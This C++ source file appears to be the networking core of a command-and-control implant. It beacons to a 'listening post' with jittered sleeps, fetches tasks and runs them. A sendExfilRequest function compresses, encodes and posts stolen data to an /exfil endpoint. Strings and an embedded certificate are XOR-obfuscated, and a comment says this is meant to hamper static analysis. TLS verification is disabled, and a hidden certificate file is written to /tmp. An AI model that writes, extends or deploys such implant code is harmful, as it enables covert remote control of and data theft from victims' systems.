#include "implant.h"
#include "tasks.h"
// #include "cert_embedded.h"
# include "cert_encrypted.h"

#include <fstream>
#include <cstdio>
#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>
#include <sstream>

#include <zlib.h>
#include <boost/archive/iterators/base64_from_binary.hpp>
#include <boost/archive/iterators/transform_width.hpp>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include <cpr/cpr.h>
#include "xor_string.hpp"

#include <nlohmann/json.hpp>


// Write the XOR‑decrypted certificate to a temporary file, return its path.
static std::string writeCertToTemp() {
    std::string tempCertPath = "/tmp/.cert.pem";
    {
        std::ofstream certFile(tempCertPath, std::ios::binary);
        for (unsigned i = 0; i < enc_cert_pem_len; ++i) {
            char c = enc_cert_pem[i] ^ 0x55;
            certFile.write(&c, 1);
        }
    }
    return tempCertPath;
}

// Build cpr::SslOptions using the provided certificate file.
static cpr::SslOptions makeSslOptions(std::string certPath) {
    return cpr::Ssl(
        cpr::ssl::VerifyHost{ false },
        cpr::ssl::VerifyPeer{ false },
        cpr::ssl::CaInfo{ std::move(certPath) }
    );
}


#ifdef DEBUG_BUILD
#define DEBUG_LOG(x) std::cout << x << std::endl
#else
#define DEBUG_LOG(x) ((void)0)
#endif


using json = nlohmann::json;


//Function to send async HTTP(S) POST with payload to listening post
[[nodiscard]] std::string sendHttpRequest(std::string_view host, 
    std::string_view port, 
    std::string_view uri, 
    std::string_view payload) {

    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;
    auto const httpVersion = 11;
    auto const requestBody = json::parse(payload);

    //construct listening post endpoint URL
    std::stringstream ss;
    ss << XOR_STR("https://") << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    //write embedded cert to temporary file
    // std::string tempCertPath = "/tmp/.cert.pem";
    // {
    //     std::ofstream certFile(tempCertPath, std::ios::binary);
    //     certFile.write(reinterpret_cast<const char*>(cert_pem), cert_pem_len);
    // }

    std::string tempCertPath = "/tmp/.cert.pem"; //this is the path to temp cert file that will be written
    // to and used for SSL connection, file is deleted after use
    // the cert is XOR encrypted in the header file and decrypted here before writing to disk to make static 
    // analysis more difficult (strings are easily extracted from binaries with tools like strings)
    {
        std::ofstream certFile(tempCertPath, std::ios::binary); //and this is the decryption loop so 
        //there should not need to be decryption of the key elsewhere
        for (unsigned i = 0; i < enc_cert_pem_len; ++i) {
            char c = enc_cert_pem[i] ^ 0x55;
            certFile.write(&c, 1);
        }
    }

    cpr::SslOptions sslOpts = cpr::Ssl(
        cpr::ssl::VerifyHost{ false }, //change these to true once the certificates are fixed!
        cpr::ssl::VerifyPeer{ false },
        cpr::ssl::CaInfo{ std::move(tempCertPath) }
    );

    cpr::AsyncResponse asyncRequest = cpr::PostAsync(
        cpr::Url{ fullServerUrl },
        cpr::Body{ requestBody.dump() },
        cpr::Header{ {XOR_STR("Content-Type"), XOR_STR("application/json")} },
        sslOpts  
    );

    //retrieve response
    cpr::Response response = asyncRequest.get();

    //show request contents
    DEBUG_LOG(XOR_STR("Request body: ") << requestBody);

    //return body of the response from listening post, THIS IS WHERE NEW TASKS ARE RECEIVED
    return response.text;

};

void sendExfilRequest(std::string_view host,
    std::string_view port,
    const std::string& label,
    const std::string& data) {
 
    // gzip compress
    uLongf compressedSize = compressBound(static_cast<uLong>(data.size()));
    std::vector<Bytef> compressed(compressedSize);
 
    z_stream zs{};
    deflateInit2(&zs, Z_BEST_COMPRESSION, Z_DEFLATED, 15 + 16, 8, Z_DEFAULT_STRATEGY);
    zs.next_in  = reinterpret_cast<Bytef*>(const_cast<char*>(data.data()));
    zs.avail_in = static_cast<uInt>(data.size());
    zs.next_out  = compressed.data();
    zs.avail_out = static_cast<uInt>(compressedSize);
    deflate(&zs, Z_FINISH);
    uLongf actualSize = zs.total_out;
    deflateEnd(&zs);
 
    // base64 encode
    using B64 = boost::archive::iterators::base64_from_binary<
    boost::archive::iterators::transform_width<const Bytef*, 6, 8>>;
    std::string encoded(B64(compressed.data()), B64(compressed.data() + actualSize));
    encoded.append((3 - actualSize % 3) % 3, '=');
 
    std::stringstream ss;
    ss << XOR_STR("https://") << host << ":" << port << XOR_STR("/exfil");
    std::string fullServerUrl = ss.str();
 
    std::string certPath = writeCertToTemp();
    cpr::SslOptions sslOpts = makeSslOptions(certPath);
 
    static_cast<void>(cpr::PostAsync(
        cpr::Url{ fullServerUrl },
        cpr::Multipart{
            {XOR_STR("payload"), encoded},
            {XOR_STR("label"),   label}
        },
        sslOpts
    ).get());
 
    DEBUG_LOG(XOR_STR("Exfil sent: ") << label);
}

//enable/disable the running status
void NetSession::setRunning(bool isRunningIn) { isRunning = isRunningIn; }

//set mean dwell time
void NetSession::setMeanDwell(double meanDwell) {
    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
}

//send task results and receive new tasks
[[nodiscard]] std::string NetSession::sendResults() {
    boost::property_tree::ptree resultsLocal;
    //scoped lock to perform swap
    {
        std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
        resultsLocal.swap(results);
    }
    //Format result
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);
    //contact listening posts with results, return received tasks
    return sendHttpRequest(host, port, uri, resultsStringStream.str());
}

void NetSession::parseTasks(const std::string& response) {
    std::stringstream responseStringStream{ response };

    //read response from listening post as JSON
    boost::property_tree::ptree tasksPropTree;
    boost::property_tree::read_json(responseStringStream, tasksPropTree);

    //Range based for-loop to parse tasks and push them to task vector
    for (const auto& [taskTreeKey, taskTreeValue] : tasksPropTree) {
        //scoped lock to push tasks into vector, push task tree and setter for config task
        {
            tasks.push_back(
                parseTaskFrom(taskTreeValue, [this](const auto& configuration) {
                    setMeanDwell(configuration.meanDwell);
                    setRunning(configuration.isRunning); })
            );
        }
    }
}


//loop and go thru takss from listening post, service them
void NetSession::serviceTasks() {
    while (isRunning) {
        std::vector<Task> localTasks;
        {
            std::scoped_lock<std::mutex> taskLock{ taskMutex };
            tasks.swap(localTasks);
        }

        for (const auto& task: localTasks) {
            //call run() on each task
            const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);

            {
                std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
                results.add(boost::uuids::to_string(id) + ".contents", contents);
                results.add(boost::uuids::to_string(id) + ".success", success);
            }
        }
        
        //sleep
        std::this_thread::sleep_for(std::chrono::seconds{ 1 });
    }
}

//beaconing to listening post
void NetSession::beacon() {
    while (isRunning) {

        //Try to contact listening post to send results/get tasks
        //If tasks received, parse and store for async execution by task thread

        try {
            DEBUG_LOG("Implant sending results to listening post...");
            const auto serverResponse = sendResults();
            DEBUG_LOG("Listening post response content: " << serverResponse);
            DEBUG_LOG("Parsing tasks received...");
            parseTasks(serverResponse);
        }
        catch (const std::exception& e) {
            DEBUG_LOG("Error occurred while beaconing: " << e.what());
        }

        //sleep for set duration w/ jitter and beacon again later
        const auto sleepTimeDouble = dwellDistributionSeconds(device);
        const auto sleepTimeChrono = std::chrono::seconds{ static_cast<unsigned long long>(sleepTimeDouble) };

        std::this_thread::sleep_for(sleepTimeChrono);    
    }
}

//Initialize variables for object
NetSession::NetSession(std::string host, std::string port, std::string uri) :
    host{ std::move(host) },
    port{ std::move(port) },
    uri{ std::move(uri) },

    isRunning{ true },
    dwellDistributionSeconds{ 10. } //make this longer for real case (~ >200)
{
}

void NetSession::start() {
    taskThread = std::async(std::launch::async, [this] {
        serviceTasks();
    });
}